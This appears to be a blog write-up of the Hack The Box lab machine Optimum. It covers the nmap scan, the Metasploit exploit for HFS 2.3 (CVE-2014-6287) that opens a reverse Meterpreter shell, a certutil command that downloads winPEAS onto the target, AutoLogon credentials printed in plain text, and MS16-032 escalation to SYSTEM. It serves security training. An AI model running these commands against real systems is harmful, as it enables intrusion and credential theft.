---
clayout: ctf
title: Optimum
date: 2025-08-29
image: /ctf/hack-the-box/machines/optimum/info-card.png
type: Hack The Box

ctf:
    - name: Optimum
      link: https://app.hackthebox.com/machines/6
      thumbnail: /ctf/hack-the-box/machines/optimum/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/6
          thumbnail: /ctf/hack-the-box/machines/optimum/pwned.png
---

## Machine Overview

This target hosts **HttpFileServer 2.3 (HFS)**, a lightweight web server known to be vulnerable to remote code execution. Enumeration confirms the exploitability, and privilege escalation is achieved via a known local Windows exploit.

## Enumeration

## Nmap Scan

We begin with a service discovery scan to identify open ports and running services:

```bash
nmap -Pn -A -oN nmap.txt 10.10.10.8
```

**Results:**

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
```

Only port **80** is open, running **HFS v2.3**.

## Web Enumeration

Research reveals that **HFS 2.3** is vulnerable to **RCE (CVE-2014-6287)**. The public Metasploit module `exploit/windows/http/rejetto_hfs_exec` can be leveraged to obtain a remote shell.

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.10.10.8
set LHOST 10.10.14.2
run
```

**Successful Exploit:**

```bash
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.8:49162)

meterpreter > shell
Microsoft Windows [Version 6.3.9600]
C:\Users\kostas\Desktop> whoami
optimum\kostas
```

We now have an initial shell as user **kostas**.

> [!NOTE] User flag
> `C:\Users\kostas\Desktop\user.txt`

## Privilege Escalation

To enumerate potential privilege escalation vectors, we upload and execute **winPEAS**:

```powershell
certutil -urlcache -split -f ^
  https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe ^
  winPEASx64.exe
.\winPEASx64.exe
```

**Interesting Finding:**

```bash
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               : kostas
    DefaultPassword               : kdeEjDowkS*
```

WinPEAS reveals stored **AutoLogon credentials** for the `kostas` account, indicating potential misconfigurations.

Next, we use Metasploit’s `local_exploit_suggester` to identify viable privilege escalation exploits:

```bash
meterpreter > background
use post/multi/recon/local_exploit_suggester
set session 3
run
```

**Highlighted Options:**

```bash
1   exploit/windows/local/bypassuac_comhijack                      
2   exploit/windows/local/bypassuac_eventvwr                       
3   exploit/windows/local/bypassuac_sluihijack                     
4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   
5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  
6   exploit/windows/local/tokenmagic
```

Among these, we select **MS16-032** for privilege escalation:

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set session 3
run
```

**Privilege Escalation Success:**

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We now have **SYSTEM-level access**.

> [!NOTE] Root flag
> `C:\Users\Administrator\Desktop\root.txt`
